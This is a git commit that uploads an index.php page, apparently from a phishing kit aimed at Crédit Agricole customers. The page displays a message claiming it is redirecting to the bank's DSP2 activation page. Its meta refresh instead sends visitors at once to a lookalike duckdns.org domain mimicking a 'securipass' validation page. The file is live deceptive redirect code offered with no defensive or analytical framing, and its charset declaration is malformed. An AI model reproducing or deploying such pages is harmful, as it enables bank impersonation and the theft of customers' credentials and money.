3b7b6eb980fb9b96025f84f3b8ae7aceeebca1d4
heliuse01 <91044101+heliuse01@users.noreply.github.com>
2022-01-03 11:20:12 +0800

    Add files via upload

---
+++ index.php
@@ -0,0 +1,19 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+<meta charset=utf-0/>
+  <title>chargement...</title>
+</head>
+
+<body>
+
+<?php
+   echo("redirection vers https://www.credit-agricole.fr/activationdsp2s...")     ;
+ echo "<META HTTP-EQUIV='Refresh' Content=0;URL='https://activ-partculier-ca.duckdns.org/validation-securipass'>";
+?>
+
+
+</body>
+</html>
